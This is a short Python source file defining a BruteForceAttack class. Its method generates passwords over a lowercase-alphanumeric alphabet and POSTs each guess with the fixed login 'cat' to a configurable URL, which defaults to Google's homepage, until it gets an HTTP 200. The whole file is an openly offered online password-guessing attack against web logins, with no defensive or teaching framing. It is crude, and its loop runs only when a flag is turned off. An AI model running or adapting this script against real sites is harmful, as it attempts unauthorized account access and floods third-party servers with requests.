import requests


class BruteForceAttack:
    def __init__(self, use_url='https://www.google.com/', used_popular=True):
        self.use_url = use_url
        self.used_popular = used_popular

    def brute_force_attack(self):
        alphabet = '0123456789qwertyuiopasdfghjklzxcvbnm'
        base = len(alphabet)

        counter = 0
        length = 0

        while not self.used_popular:

            password = ""
            number = counter
            while number > 0:
                x = number // base
                rest = number % base
                password = alphabet[rest] + password
                number = x

            while len(password) < length:
                password = alphabet[0] + password

            print(length, counter, password)
            response = requests.post(self.use_url, json={'login': 'cat', 'password': password})
            if response.status_code == 200:
                print('SUCCESS', password)
                break

            if alphabet[-1] * length == password:
                length += 1
                counter = 0
            else:
                counter += 1
